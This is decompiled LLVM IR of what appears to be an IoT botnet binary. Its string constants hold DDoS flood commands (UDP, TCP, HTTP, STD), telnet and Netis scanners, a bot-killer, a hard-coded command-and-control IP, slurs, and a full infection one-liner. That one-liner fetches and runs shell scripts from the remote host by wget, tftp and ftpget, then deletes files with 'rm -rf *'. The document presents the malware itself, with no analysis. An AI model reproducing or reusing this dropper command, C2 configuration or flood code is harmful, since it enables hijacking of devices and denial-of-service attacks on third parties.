@global_var_23a78.1125 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_22718.1063, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_22758.1064, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_22798.1065, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_22828.1066, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_22860.1067, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_22880.1068, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_22898.1069, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_228f0.1070, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_22990.1071, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_229e4.1072, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_22a58.1073, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_22a98.1074, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_22b50.1075, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_22ba4.1076, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_22bfc.1077, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_22c54.1078, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_22c94.1079, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_22cdc.1080, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_22d34.1081, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_22da0.1082, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_22df8.1083, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_22e48.1084, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_22e6c.1085, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_22ec8.1086, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_22ed8.1087, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_22f08.1088, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_22f2c.1089, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_22f50.1090, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_22f6c.1091, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_22fac.1092, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_23038.1093, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_23080.1094, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_230c8.1095, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_23110.1096, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_23158.1097, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_231ac.1098, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_231fc.1099, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_23268.1100, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_232bc.1101, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_23318.1102, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_23374.1103, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_233d8.1104, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_23434.1105, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_23490.1106, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_234ec.1107, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_2354c.1108, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_23594.1109, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_2362c.1110, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_23678.1111, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_236c4.1112, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_23714.1113, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_2375c.1114, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_237b0.1115, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_23800.1116, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_23848.1117, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_23894.1118, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_238e0.1119, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_23928.1120, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_23978.1121, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_239c8.1122, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_239fc.1123, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_23a30.1124, i32 0, i32 0)]
@global_var_226f0.1127 = constant [6 x i8] c"close\00"
@global_var_226f8.1128 = constant [11 x i8] c"keep-alive\00"
@global_var_22704.1129 = constant [7 x i8] c"accept\00"
@global_var_2270c.1130 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_226f0.1127, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_226f8.1128, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_22704.1129, i32 0, i32 0)]
@global_var_23b70.1134 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_23bb0.1136 = constant [6 x i8] c"arfgG\00"
@global_var_23bb8.1137 = constant [9 x i8] c"HBiug655\00"
@global_var_23bc4.1138 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_23bd4.1139 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_23be8.1140 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_23bfc.1141 = constant [12 x i8] c"GJjyur67458\00"
@global_var_23c08.1142 = constant [12 x i8] c"RYSDk747586\00"
@global_var_23c14.1143 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_23c20.1144 = constant [10 x i8] c"KHGK7985i\00"
@global_var_23c2c.1145 = constant [11 x i8] c"yuituiILYF\00"
@global_var_23c38.1146 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_23c48.1147 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_23c54.1148 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_23c64.1149 = constant [9 x i8] c"ewqdcftr\00"
@global_var_23c70.1150 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_23c80.1151 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_23c8c.1152 = constant [12 x i8] c"twehgbferhb\00"
@global_var_23c98.1153 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_23ca4.1154 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_23cb4.1155 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_23cc4.1156 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_23cd4.1157 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_23ce0.1158 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_23cf0.1159 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_23d00.1160 = constant [12 x i8] c"yteytietyue\00"
@global_var_23d0c.1161 = constant [9 x i8] c"qsortEQS\00"
@global_var_23d18.1162 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_23d28.1163 = constant [4 x i8] c"std\00"
@global_var_23d2c.1164 = constant [4 x i8] c"dts\00"
@global_var_23d30.1165 = constant [6 x i8] c"hackz\00"
@global_var_23d38.1166 = constant [7 x i8] c"shdyed\00"
@global_var_23d40.1167 = constant [5 x i8] c"http\00"
@global_var_23d48.1168 = constant [10 x i8] c"sghwiondc\00"
@global_var_23d54.1169 = constant [7 x i8] c"nigger\00"
@global_var_23d5c.1170 = constant [6 x i8] c"pussy\00"
@global_var_23d64.1171 = constant [7 x i8] c"faggot\00"
@global_var_23d6c.1172 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_23bb0.1136, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_23bb8.1137, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_23bc4.1138, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_23bd4.1139, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_23be8.1140, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_23bfc.1141, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_23c08.1142, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_23c14.1143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_23c20.1144, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_23c2c.1145, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_23c38.1146, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_23c48.1147, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_23c54.1148, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_23c64.1149, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_23c70.1150, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_23c80.1151, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_23c8c.1152, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_23c98.1153, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_23ca4.1154, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_23cb4.1155, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_23cc4.1156, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_23cd4.1157, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_23ce0.1158, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_23cf0.1159, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_23d00.1160, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_23d0c.1161, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_23d18.1162, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_23d28.1163, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_23d2c.1164, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_23d30.1165, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23d38.1166, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_23d40.1167, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_23d48.1168, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23d54.1169, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_23d5c.1170, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_23d64.1171, i32 0, i32 0)]
@global_var_23dfc.1175 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_23e18.1177 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_23e3c.1182 = constant [4 x i8] c"all\00"
@global_var_23e40.1184 = constant i32 738197504
@global_var_23e44.1186 = constant [4 x i8] c"syn\00"
@global_var_23e48.1188 = constant [4 x i8] c"rst\00"
@global_var_23e4c.1190 = constant [4 x i8] c"fin\00"
@global_var_23e50.1192 = constant [4 x i8] c"ack\00"
@global_var_23e54.1194 = constant [4 x i8] c"psh\00"
@global_var_23e58.1196 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_23e6c.1200 = constant [6 x i8] c"PONG!\00"
@global_var_23e74.1202 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_23e80.1205 = constant [10 x i8] c"My IP: %s\00"
@global_var_23e8c.1207 = constant [8 x i8] c"BOTKILL\00"
@global_var_23e94.1209 = constant [13 x i8] c"Killing Bots\00"
@global_var_23ea4.1211 = constant [7 x i8] c"LOOPME\00"
@global_var_23eac.1213 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_23ebc.1215 = constant [7 x i8] c"TELNET\00"
@global_var_23ec4.1217 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_23ed4.1219 = constant [4 x i8] c"OFF\00"
@global_var_346bc.1221 = global i32 0
@global_var_23ed8.1223 = constant [5 x i8] c" OFF\00"
@global_var_23ee0.1225 = constant [3 x i8] c"ON\00"
@global_var_23ee4.1227 = constant [6 x i8] c"NETIS\00"
@global_var_23eec.1229 = constant [25 x i8] c"[NETIS] SCANNER Starting\00"
@global_var_23f08.1231 = constant [5 x i8] c"HOLD\00"
@global_var_23f10.1234 = constant [5 x i8] c"JUNK\00"
@global_var_23f18.1236 = constant [4 x i8] c"UDP\00"
@global_var_23f1c.1238 = constant [5 x i8] c"HTTP\00"
@global_var_23f24.1240 = constant [4 x i8] c"CNC\00"
@global_var_23f28.1242 = constant [6 x i8] c"COMBO\00"
@global_var_23f30.1244 = constant [4 x i8] c"STD\00"
@global_var_23f34.1246 = constant [4 x i8] c"TCP\00"
@global_var_23f38.1248 = constant [5 x i8] c"STOP\00"
@global_var_23f40.1252 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_2e15c.1255 = local_unnamed_addr global i32 -1
@global_var_1f11c.1257 = constant [15 x i8] c"191.96.249.102\00"
@global_var_2e028.1258 = global [15 x i8]* @global_var_1f11c.1257
@global_var_2e02c.1260 = local_unnamed_addr global i32 987
@global_var_23f4c.1262 = constant [8 x i8] c"8.8.8.8\00"
@global_var_23f54.1265 = constant [16 x i8] c"/proc/net/route\00"
@global_var_23f64.1267 = constant [11 x i8] c"\0900000000\09\00"
@global_var_2e468.1269 = global i32 0
@global_var_23f70.1271 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_23f80.1273 = constant [7 x i8] c"SERVER\00"
@global_var_23f88.1275 = constant [7 x i8] c"ROUTER\00"
@global_var_23f90.1277 = constant i32 0
@global_var_23f94.1280 = constant [5 x i8] c"sshd\00"
@global_var_23f9c.1282 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_2e158.1284 = global i32 1
@global_var_23fb0.1287 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_23fc0.1289 = constant i32 788529152
@global_var_24040.1292 = constant [9 x i8] c"VOIDV1.0\00"
@global_var_23fc4.1294 = constant i32 458961211
@global_var_2404c.1299 = constant [5 x i8] c"PONG\00"
@global_var_24054.1301 = constant [4 x i8] c"DUP\00"
@global_var_24058.1303 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant i32 1912602624
@global_var_24064.1307 = constant i32 536870912
@global_var_2e1e4 = external global i32
@global_var_2e1ec = external local_unnamed_addr global i32
@global_var_34688.1316 = global i32 0
@global_var_24668.1321 = constant i32 0
@global_var_2e208.1323 = global i32 0
@global_var_2e220.1325 = global i32 0
@global_var_2e204.1327 = global i32* bitcast (i8** @global_var_2e23c.1311 to i32*)
@global_var_14604.1330 = constant i32 -382910448
@global_var_19220.1331 = constant i32 -382909968
@global_var_195d4.1336 = constant i32 -382910224
@global_var_2469c.1338 = constant i32 269488136
@global_var_24680.1340 = constant [6 x i8] c"(nil)\00"
@global_var_24688.1343 = constant [7 x i8] c"(null)\00"
@global_var_34480.1345 = global i32 0
@global_var_2e32c.1346 = global i32* @global_var_34480.1345
@global_var_2e336.1347 = global i32 0
@global_var_346ec.1349 = global i32 0
@global_var_24690.1351 = constant i32 721431808
@global_var_246fa.1354 = constant i32 65793
@global_var_246e2.1356 = constant i32 524293
@global_var_24720.1362 = constant [8 x i8] c" +0-#'I\00"
@global_var_246a4.1364 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_24708.1366 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_246d7.1368 = constant i32 50331911
@global_var_246d8.1370 = constant i32 67343
@global_var_246c8.1372 = constant i32 268435461
@global_var_246b8.1374 = constant i32 520093701
@global_var_346c4.1377 = global i32 0
@global_var_1578c.1378 = constant i32 -456978431
@global_var_3448c.1384 = global i32 0
@global_var_24738.1386 = constant [8 x i8] c"Success\00"
@global_var_24728.1388 = constant [15 x i8] c"Unknown error \00"
@global_var_2e434 = external global i32
@global_var_2529c.1394 = constant [8 x i8] c"Error 0\00"
@global_var_252a4.1395 = constant [13 x i8] c"Unknown host\00"
@global_var_252b4.1396 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_252d0.1397 = constant [21 x i8] c"Unknown server error\00"
@global_var_252e8.1398 = constant [32 x i8] c"No address associated with name\00"
@global_var_2531c.1399 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_2529c.1394, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_252a4.1395, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_252b4.1396, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_252d0.1397, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_252e8.1398, i32 0, i32 0)]
@global_var_25308.1401 = constant [15 x i8] c"Resolver error\00"
@global_var_25318.1403 = constant [3 x i8] c": \00"
@global_var_2531a.1405 = constant i32 2
@global_var_2e1f8 = external local_unnamed_addr global i32
@global_var_25294.1410 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_34490.1412 = global i32 0
@global_var_34658.1414 = global i32 0
@global_var_344a0.1416 = global i32 0
@global_var_34714.1418 = global i32 0
@global_var_2e330.1421 = global i32 0
@global_var_3471c.1425 = global i32 0
@global_var_34718.1427 = global i32 0
@global_var_34750.1429 = global i32 0
@global_var_3475c.1430 = local_unnamed_addr global i32 0
@global_var_34748.1431 = local_unnamed_addr global i32 0
@global_var_34a78.1432 = local_unnamed_addr global i32 0
@global_var_34a68.1433 = local_unnamed_addr global i32 0
@global_var_34a70.1434 = local_unnamed_addr global i32 0
@global_var_34a6c.1435 = local_unnamed_addr global i32 0
@global_var_16350.1436 = constant i32 -478937055
@global_var_34a74.1437 = local_unnamed_addr global i32 0
@global_var_34a80.1438 = local_unnamed_addr global i32 0
@global_var_34a8c.1439 = local_unnamed_addr global i32 0
@global_var_34a84.1440 = local_unnamed_addr global i32 0
@global_var_34a90.1441 = local_unnamed_addr global i32 0
@global_var_34a7c.1442 = local_unnamed_addr global i32 0
@global_var_34a64.1443 = local_unnamed_addr global i32 0
@global_var_34a60.1444 = local_unnamed_addr global i32 0
@global_var_34a88.1445 = local_unnamed_addr global i32 0
@global_var_34758.1454 = local_unnamed_addr global i32 0
@global_var_16c04.1455 = constant i32 -443535360
@global_var_2e348.1460 = global i32 0
@global_var_3466c.1462 = global i32 0
@global_var_14288.1464 = constant i32 -509587456
@global_var_2e360.1466 = global i32 0
@global_var_2e378 = external global i32
@global_var_2e390.1472 = global i32 -1726662223
@global_var_2e380.1479 = local_unnamed_addr global i32* @global_var_2e390.1472
@global_var_2e37c.1487 = global i32* @global_var_2e390.1472
@global_var_25330.1495 = constant i32 0
@global_var_1f31d.1500 = constant [378 x i8] c"191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_2e40c.1505 = global i32 0
@global_var_34670.1509 = local_unnamed_addr global i32 0
@global_var_1454c.1512 = constant i32 -382908944
@global_var_142b0.1513 = constant i32 -382910448
@global_var_25358.1516 = constant [11 x i8] c"/proc/stat\00"
@global_var_25364.1520 = constant i32 536870912
@global_var_25368.1522 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_2539c.1525 = constant i32 3803392
@global_var_25378.1527 = constant [10 x i8] c"processor\00"
@global_var_17a2c.1528 = constant i32 98152
@global_var_34678.1540 = global i32 0
@global_var_2e004.1542 = global i32 -1
@global_var_34680.1545 = global i32 0
@global_var_34684.1547 = global i32 0
@global_var_18108.1548 = constant i32 -390234064
@global_var_253a0.1550 = constant [10 x i8] c"/dev/null\00"
@global_var_3467c.1552 = global i32 0
@global_var_34674.1556 = local_unnamed_addr global i32 0
@global_var_15840.1559 = constant i32 -369093646
@global_var_2e424 = external local_unnamed_addr global i32
@global_var_252cc.1563 = constant i32 0
@global_var_2e42c = external local_unnamed_addr global i32
@global_var_2e428.1566 = global i32* @global_var_252cc.1563
@global_var_14360.1573 = constant i32 -442564608
@global_var_18bc0.1575 = constant i32 -442564608
@global_var_18400.1576 = constant i32 -335545106
@global_var_253ac.1578 = constant [8 x i8] c"/bin/sh\00"
@global_var_253b4.1580 = constant [3 x i8] c"sh\00"
@global_var_253b8.1582 = constant [3 x i8] c"-c\00"
@global_var_18668.1584 = constant i32 -275775369
@global_var_34690.1588 = global i32 0
@global_var_3468c.1606 = global i32 0
@global_var_16dac.1607 = constant i32 -382910224
@global_var_25380.1609 = constant i32 1912602624
@global_var_1a468.1613 = constant i32 -382906384
@global_var_32478.1616 = global i32 0
@global_var_3247c.1619 = global i32 0
@global_var_20003.1623 = constant [6 x i8] c"%d.%d\00"
@global_var_20000.1624 = constant [9 x i8] c"44.%d.%d\00"
@global_var_2e238.1627 = global i32 2
@global_var_256d4.1639 = constant [4 x i8] c"inf\00"
@global_var_256e8.1642 = constant [3 x i8] c"@$\00"
@global_var_256d7.1646 = constant i32 4804166
@global_var_256e4.1648 = constant i32 771763200
@global_var_34a94.1697 = global i32 0
@global_var_34a98.1699 = global i32 0
@global_var_1c0c8.1701 = constant i32 -382910352
@global_var_25734.1707 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_25730.1711 = constant [3 x i8] c"%x\00"
@global_var_142e0.1713 = constant i32 -382910448
@global_var_34698.1715 = global i32 0
@global_var_34aac.1720 = global i32 0
@global_var_34aa0.1722 = global i32 0
@global_var_34aa8.1726 = global i32 0
@global_var_34694.1730 = global i32 0
@global_var_34aa4.1733 = global i32 0
@global_var_34a9c.1740 = global i32 0
@global_var_25748.1742 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_346b0.1744 = global i32 0
@global_var_1da6c.1745 = constant i32 -382910352
@global_var_2575c.1751 = constant [11 x i8] c"nameserver\00"
@global_var_25768.1754 = constant [7 x i8] c"domain\00"
@global_var_25770.1756 = constant [7 x i8] c"search\00"
@global_var_25778.1758 = constant [8 x i8] c"options\00"
@global_var_25780.1760 = constant [8 x i8] c"timeout\00"
@global_var_25788.1762 = constant [9 x i8] c"attempts\00"
@global_var_20035.1766 = constant [5 x i8] c"d.%d\00"
@global_var_25794.1767 = constant [5 x i8]* @global_var_20035.1766
@global_var_257a4.1774 = constant [11 x i8] c"/etc/hosts\00"
@global_var_257b0.1777 = constant [4 x i8] c"# \09\00"
@global_var_1e874.1779 = constant i32 -504313148
@global_var_1e85c.1780 = constant i32 -483131392
@global_var_1e71c.1781 = constant i32 -481294847
@global_var_1e8d4.1782 = constant i32 -477821825
@global_var_1e9d4.1783 = constant i32 -476034303
@global_var_1ecc0.1784 = constant i32 -516685812
@global_var_1ebc4.1785 = constant i32 -905969576
@global_var_1ed40.1786 = constant i32 -478149505
@global_var_1ed28.1787 = constant i32 -534773758
@global_var_1ecdc.1788 = constant i32 -534773758
@global_var_1ec74.1789 = constant i32 -483131392
@global_var_2e008.1791 = global i32 0
@global_var_2e440.6 = external global i8*
@global_var_2e46e.68 = external global i8*
@global_var_2e46f.69 = local_unnamed_addr global i8 0
@global_var_2e470.70 = local_unnamed_addr global i8 0
@global_var_2e471.71 = local_unnamed_addr global i8 0
@global_var_2e472.72 = local_unnamed_addr global i8 0
@2 = internal constant [3 x i8] c"\01 \00"
@global_var_2e23c.1311 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_2e28c.1312 = local_unnamed_addr global i8 1
@global_var_2e23d.1318 = local_unnamed_addr global i8 32
@global_var_2e28d.1319 = local_unnamed_addr global i8 16
@global_var_18078.1329 = constant i8 -29
@3 = internal constant [2 x i8] c"\03\00"
@global_var_2e43b.1724 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_2e438.1728 = external global i8*
@global_var_2e439.1731 = local_unnamed_addr global i8 1
@4 = internal constant [3 x i8] c"\05\03\00"
@global_var_2e43a.1736 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @4, i32 0, i32 0)
@global_var_24060.1305 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_2e440.6 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_2e440.6 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_2e020.9 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_2e020.9 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_2e020.9 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_2e020.9 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
